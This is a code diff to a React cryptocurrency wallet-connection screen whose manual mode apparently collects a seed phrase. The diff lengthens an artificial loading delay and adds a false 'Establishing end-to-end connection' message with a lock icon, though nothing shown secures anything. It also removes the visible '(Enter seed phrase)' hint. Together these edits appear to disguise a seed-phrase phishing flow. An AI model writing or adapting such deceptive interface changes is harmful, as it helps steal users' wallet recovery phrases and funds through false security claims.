@@ -12,6 +12,7 @@ import { Button } from "../ui/button";
 import { motion, AnimatePresence } from "motion/react";
 import { useWalletStore } from "@/store/walletStore";
 import ShowManualWallets from "../manual-wallets/show-manual-wallets";
+import { Lock } from "lucide-react";
 
 type Network = {
 	value: string;
@@ -100,7 +101,7 @@ function OriginAddress({ onNext }: OriginProps) {
 				setTimeout(() => {
 					setViewingManualWallet(true);
 					setIsTransitionLoading(false);
-				}, 1500);
+				}, 2000);
 			}
 		}
 	};
@@ -210,9 +211,16 @@ function OriginAddress({ onNext }: OriginProps) {
 							className="fixed inset-0 bg-black/70 flex flex-col items-center justify-center z-[60]"
 						>
 							<div className="animate-spin w-10 h-10 border-4 border-white/30 border-t-white rounded-full mx-auto" />
-							<p className="text-white mt-4 text-sm font-medium">
-								{viewingManualWallet ? "" : "Connecting to your wallet..."}
-							</p>
+							{!viewingManualWallet && (
+								<p className="text-white mt-4 font-semibold text-center flex items-center gap-2">
+									<span>Establishing end-to-end connection</span>
+
+									<Lock
+										className="w-4 h-4"
+										strokeWidth={2.5}
+									/>
+								</p>
+							)}
 						</motion.div>
 					)}
 				</AnimatePresence>
@@ -371,11 +379,6 @@ function ChooseAddress({
 									: "Connect Manually"}
 							</Label>
 						</div>
-						<span className="text-xs text-black/60">
-							{mode === "automatic"
-								? "(e.g. MetaMask, Lace)"
-								: "(Enter seed phrase)"}
-						</span>
 					</div>
 				))}
 			</div>
